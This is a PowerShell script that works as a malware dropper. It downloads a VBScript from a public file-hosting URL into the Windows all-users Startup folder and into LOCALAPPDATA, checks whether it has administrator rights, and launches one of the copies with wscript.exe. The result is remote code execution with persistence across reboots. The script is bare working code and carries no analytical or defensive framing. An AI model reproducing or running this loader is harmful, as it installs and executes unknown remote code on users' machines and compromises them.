$url = "https://files.catbox.moe/5qk193.vbs"

$destination1 = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\5qk193.vbs"
$localAppData = $env:LOCALAPPDATA
$destination2 = Join-Path $localAppData "5qk193.vbs"

# Download to both locations
Invoke-WebRequest -Uri $url -OutFile $destination1
Invoke-WebRequest -Uri $url -OutFile $destination2

# Function to check for admin rights
function Is-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if (Is-Admin) {
    # Running as admin - start script from destination1
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination1`"" -NoNewWindow
} else {
    # Not admin - start script from destination2
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination2`"" -NoNewWindow
}

exit
